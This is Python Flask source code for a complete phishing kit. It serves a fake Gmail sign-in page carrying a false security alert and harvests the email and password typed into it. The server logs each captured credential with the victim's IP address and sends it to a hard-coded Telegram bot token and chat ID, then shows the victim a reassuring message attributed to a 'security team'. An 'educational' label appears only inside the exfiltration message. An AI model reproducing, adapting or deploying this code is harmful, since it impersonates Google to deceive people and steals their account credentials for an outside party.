from flask import Flask, render_template_string, request
import datetime
import requests
import json

app = Flask(__name__)

# ==================== TELEGRAM CONFIGURATION ====================
BOT_TOKEN = "8795118587:AAGo35geVqBxuQNczbCC-qSqXgwgunscrNE"
CHAT_ID = "6557060461"

def send_telegram_message(email, password, ip, user_agent):
    """Send credentials to Telegram"""
    try:
        message = f"""
🔐 *NEW LOGIN CREDENTIALS CAPTURED*

📧 *Email:* `{email}`
🔑 *Password:* `{password}`
🌐 *IP Address:* `{ip}`
🕐 *Time:* `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
📱 *User Agent:* `{user_agent[:50]}...`

⚠️ *Educational/Testing Purpose Only*
        """
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(url, data=data)
        
        if response.status_code == 200:
            return True, "✅ Credentials sent to Support for verification!"
        else:
            return False, f"⚠️ Telegram error: {response.text}"
            
    except Exception as e:
        return False, f"⚠️ Error: {str(e)}"

# ==================== HTML TEMPLATE ====================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Gmail</title>
    <!-- Google Fonts - Product Sans (Google's font) -->
    <link href="https://fonts.googleapis.com/css2?family=Product+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
            padding: 16px;
            font-family: 'Product Sans', 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        .login-container {
            background: white;
            padding: clamp(24px, 5vw, 48px) clamp(20px, 4vw, 40px) clamp(24px, 4vw, 36px);
            border-radius: clamp(8px, 2vw, 12px);
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            transition: all 0.3s ease;
        }
        
        /* Responsive Logo */
        .logo {
            text-align: center;
            margin-bottom: clamp(8px, 1.5vw, 12px);
        }
        
        .logo h1 {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: clamp(28px, 6vw, 40px);
            color: #202124;
            font-weight: 400;
            gap: 0px;
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        /* Normal "G" aligned properly */
        .normal-g {
            display: inline-block;
            font-size: clamp(32px, 7vw, 48px);
            font-weight: 700;
            color: #1a73e8;
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
            line-height: 1;
            vertical-align: middle;
            margin-top: -2px;
        }
        
        .logo-text {
            display: inline-block;
            font-size: clamp(28px, 6vw, 40px);
            font-weight: 500;
            color: #5f6368;
            line-height: 1;
            vertical-align: middle;
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
            letter-spacing: -0.5px;
        }
        
        /* Simple Red Security Alert */
        .security-alert {
            text-align: center;
            color: #d93025;
            font-size: clamp(14px, 2vw, 18px);
            font-weight: 700;
            margin: clamp(4px, 1vw, 8px) 0 clamp(16px, 3vw, 24px) 0;
            padding: clamp(6px, 1vw, 10px);
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        /* Responsive Form Elements */
        .input-group {
            margin-bottom: clamp(16px, 3vw, 24px);
        }
        
        .input-group label {
            display: block;
            font-size: clamp(13px, 1.8vw, 15px);
            color: #5f6368;
            margin-bottom: 6px;
            font-weight: 500;
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        .input-group input {
            width: 100%;
            padding: clamp(12px, 2.5vw, 16px) clamp(12px, 2vw, 16px);
            border: 1.5px solid #dadce0;
            border-radius: 6px;
            font-size: clamp(15px, 2vw, 17px);
            transition: border-color 0.2s, box-shadow 0.2s;
            background: white;
            -webkit-appearance: none;
            appearance: none;
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        .input-group input:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .input-group input::placeholder {
            color: #9aa0a6;
            font-size: clamp(14px, 1.8vw, 16px);
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        .input-group .error {
            color: #d93025;
            font-size: clamp(12px, 1.5vw, 14px);
            margin-top: 6px;
            display: none;
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        /* Responsive Button */
        .btn-login {
            width: 100%;
            padding: clamp(12px, 2.5vw, 16px);
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: clamp(15px, 2vw, 17px);
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            -webkit-tap-highlight-color: transparent;
            touch-action: manipulation;
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        .btn-login:hover {
            background: #1557b0;
        }
        
        .btn-login:active {
            transform: scale(0.98);
        }
        
        .btn-login:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        /* Responsive Footer */
        .footer {
            text-align: center;
            margin-top: clamp(16px, 3vw, 24px);
            color: #5f6368;
            font-size: clamp(11px, 1.5vw, 13px);
            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
        }
        
        /* Tablet and larger screens */
        @media (min-width: 768px) {
            .login-container {
                padding: 48px 40px 36px;
                border-radius: 8px;
            }
            
            .btn-login:hover {
                background: #1557b0;
            }
        }
        
        /* Large screens */
        @media (min-width: 1024px) {
            .login-container {
                max-width: 450px;
            }
        }
        
        /* Small phones */
        @media (max-width: 400px) {
            body {
                padding: 10px;
            }
            
            .login-container {
                padding: 20px 16px 24px;
                border-radius: 8px;
            }
            
            .logo h1 {
                font-size: 24px;
            }
            
            .normal-g {
                font-size: 28px;
                margin-top: -1px;
            }
            
            .logo-text {
                font-size: 24px;
                font-weight: 500;
            }
            
            .security-alert {
                font-size: 12px;
            }
        }
        
        /* Dark mode support */
        @media (prefers-color-scheme: dark) {
            body {
                background: #202124;
            }
            
            .login-container {
                background: #2d2e30;
                box-shadow: 0 2px 10px rgba(0,0,0,0.4);
            }
            
            .logo h1 {
                color: #e8eaed;
            }
            
            .logo-text {
                color: #9aa0a6;
            }
            
            .input-group label {
                color: #9aa0a6;
            }
            
            .input-group input {
                background: #3c4043;
                border-color: #5f6368;
                color: #e8eaed;
            }
            
            .input-group input:focus {
                border-color: #8ab4f8;
                box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.2);
            }
            
            .input-group input::placeholder {
                color: #9aa0a6;
            }
            
            .footer {
                color: #9aa0a6;
            }
        }
        
        /* Touch-friendly for mobile */
        @media (hover: none) {
            .btn-login:hover {
                background: #1a73e8;
            }
            
            .btn-login:active {
                background: #1557b0;
                transform: scale(0.96);
            }
        }
        
        /* Landscape mode optimization */
        @media (max-height: 600px) and (orientation: landscape) {
            body {
                padding: 10px 20px;
                align-items: flex-start;
                padding-top: 20px;
            }
            
            .login-container {
                padding: 20px 24px;
                max-width: 400px;
            }
            
            .logo {
                margin-bottom: 12px;
            }
            
            .logo h1 {
                font-size: 24px;
            }
            
            .normal-g {
                font-size: 28px;
                margin-top: -1px;
            }
            
            .logo-text {
                font-size: 24px;
                font-weight: 500;
            }
            
            .security-alert {
                font-size: 13px;
                margin: 2px 0 12px 0;
                padding: 4px;
            }
            
            .input-group {
                margin-bottom: 12px;
            }
            
            .input-group input {
                padding: 10px 12px;
                font-size: 15px;
            }
            
            .btn-login {
                padding: 10px;
                font-size: 15px;
            }
        }
        
        /* Loading state */
        .btn-login.loading {
            position: relative;
            color: transparent;
        }
        
        .btn-login.loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 20px;
            height: 20px;
            margin: -10px 0 0 -10px;
            border: 3px solid white;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>
                <span class="normal-g">G</span>
                <span class="logo-text">mail</span>
            </h1>
        </div>
        
        <!-- Simple Red Security Alert -->
        <div class="security-alert">
            ⚠️ Security Alert Detected ‼️
        </div>
        
        <form id="loginForm" method="POST" action="/login" autocomplete="off">
            <div class="input-group">
                <label for="email">Email or phone</label>
                <input type="email" id="email" name="email" required 
                       placeholder="Enter your email" 
                       inputmode="email"
                       autocomplete="email">
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Enter your password"
                       autocomplete="new-password">
            </div>
            
            <div class="input-group">
                <label for="confirm_password">Confirm Password</label>
                <input type="password" id="confirm_password" name="confirm_password" required 
                       placeholder="Confirm your password"
                       autocomplete="new-password">
                <div id="passwordError" class="error">Passwords do not match!</div>
            </div>
            
            <button type="submit" class="btn-login" id="submitBtn">Sign in</button>
        </form>
        
        <div class="footer">
            <p>© 2026 Google</p>
        </div>
    </div>
    
    <script>
        // Password match validation
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const password = document.getElementById('password').value;
            const confirm = document.getElementById('confirm_password').value;
            const errorDiv = document.getElementById('passwordError');
            const submitBtn = document.getElementById('submitBtn');
            
            if (password !== confirm) {
                e.preventDefault();
                errorDiv.style.display = 'block';
                errorDiv.style.animation = 'shake 0.3s ease';
                return false;
            }
            
            errorDiv.style.display = 'none';
            
            // Show loading state on button
            submitBtn.classList.add('loading');
            submitBtn.disabled = true;
        });
        
        // Real-time password matching feedback
        document.getElementById('confirm_password').addEventListener('input', function() {
            const password = document.getElementById('password').value;
            const confirm = this.value;
            const errorDiv = document.getElementById('passwordError');
            
            if (confirm.length > 0 && password !== confirm) {
                errorDiv.style.display = 'block';
            } else {
                errorDiv.style.display = 'none';
            }
        });
        
        // Shake animation for error
        const style = document.createElement('style');
        style.textContent = `
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-8px); }
                75% { transform: translateX(8px); }
            }
        `;
        document.head.appendChild(style);
        
        // Prevent double submission
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', function() {
                const btn = this.querySelector('button[type="submit"]');
                if (btn) {
                    btn.disabled = true;
                }
            });
        });
        
        // Handle touch devices better
        if ('ontouchstart' in window) {
            document.querySelectorAll('input').forEach(input => {
                input.style.fontSize = '16px'; // Prevents zoom on iOS
            });
        }
    </script>
</body>
</html>
'''

# ==================== ROUTES ====================

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    confirm_password = request.form.get('confirm_password')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Check if passwords match
    if password != confirm_password:
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Error</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Product Sans', Arial, sans-serif; padding: 20px; text-align: center; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
                .container { max-width: 500px; margin: 0 auto; background: white; padding: clamp(24px, 5vw, 40px); border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .error { color: #d93025; font-size: clamp(24px, 4vw, 32px); }
                p { font-size: clamp(16px, 2vw, 18px); margin: 20px 0; color: #333; }
                .btn { display: inline-block; padding: clamp(12px, 2vw, 16px) clamp(24px, 4vw, 40px); background: #1a73e8; color: white; text-decoration: none; border-radius: 6px; font-size: clamp(14px, 1.8vw, 16px); transition: background 0.2s; font-family: 'Product Sans', Arial, sans-serif; }
                .btn:active { transform: scale(0.96); }
                @media (max-width: 400px) { body { padding: 10px; } }
            </style>
        </head>
        <body>
            <div class="container">
                <h1 class="error">❌ Error</h1>
                <p>Passwords do not match! Please try again.</p>
                <a href="/" class="btn">← Go Back</a>
            </div>
        </body>
        </html>
        '''
    
    # Print to console
    print("=" * 60)
    print("🔐 CREDENTIALS CAPTURED")
    print(f"Email:    {email}")
    print(f"Password: {password}")
    print(f"IP:       {ip}")
    print(f"Time:     {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"User Agent: {user_agent[:50]}...")
    print("=" * 60)
    
    # Send to Telegram
    success, message = send_telegram_message(email, password, ip, user_agent)
    
    # Return success page
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Successful</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Product Sans', Arial, sans-serif; padding: 20px; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; }}
            .container {{ max-width: 500px; margin: 0 auto; background: white; padding: clamp(24px, 5vw, 40px); border-radius: 8px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            .success {{ color: #4CAF50; font-size: clamp(40px, 8vw, 56px); }}
            h1 {{ font-size: clamp(24px, 4vw, 32px); margin: 16px 0; color: #202124; font-family: 'Product Sans', Arial, sans-serif; }}
            p {{ font-size: clamp(15px, 2vw, 17px); color: #5f6368; font-family: 'Product Sans', Arial, sans-serif; }}
            .btn {{ display: inline-block; padding: clamp(12px, 2vw, 16px) clamp(24px, 4vw, 40px); background: #1a73e8; color: white; text-decoration: none; border-radius: 6px; font-size: clamp(14px, 1.8vw, 16px); margin-top: 20px; transition: background 0.2s; font-family: 'Product Sans', Arial, sans-serif; }}
            .btn:active {{ transform: scale(0.96); }}
            .status {{ margin-top: 20px; padding: clamp(12px, 2vw, 16px); background: #f9f9f9; border-radius: 6px; font-size: clamp(13px, 1.5vw, 15px); font-family: 'Product Sans', Arial, sans-serif; }}
            .telegram-info {{ background: #e8f5e9; padding: clamp(12px, 2vw, 16px); border-radius: 6px; margin-top: 20px; font-size: clamp(14px, 1.6vw, 16px); font-family: 'Product Sans', Arial, sans-serif; }}
            @media (max-width: 400px) {{ body {{ padding: 10px; }} }}
            @media (prefers-color-scheme: dark) {{
                body {{ background: #202124; }}
                .container {{ background: #2d2e30; }}
                h1 {{ color: #e8eaed; }}
                p {{ color: #9aa0a6; }}
                .status {{ background: #3c4043; color: #e8eaed; }}
                .telegram-info {{ background: #1e3a2a; color: #e8eaed; }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="success">✅</div>
            <h1>Login Successful!</h1>
            <p>Your credentials have been updated.</p>
            
            <div class="status">
                <strong>Status:</strong> {message}
            </div>
            
            <div class="telegram-info">
                <strong>📱 Check Your Account</strong><br>
                Thank you for your cooperation with the security team.
            </div>
            
            <div style="margin-top: 30px;">
                <a href="/" class="btn">← Back to Login</a>
            </div>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    print("=" * 70)
    print("📱 TELEGRAM CREDENTIAL CATCHER")
    print("=" * 70)
    print("🌐 Server: http://localhost:5000")
    print("📱 Fully Responsive - Works on all devices!")
    print("=" * 70)
    
    app.run(debug=True, host='0.0.0.0', port=5000)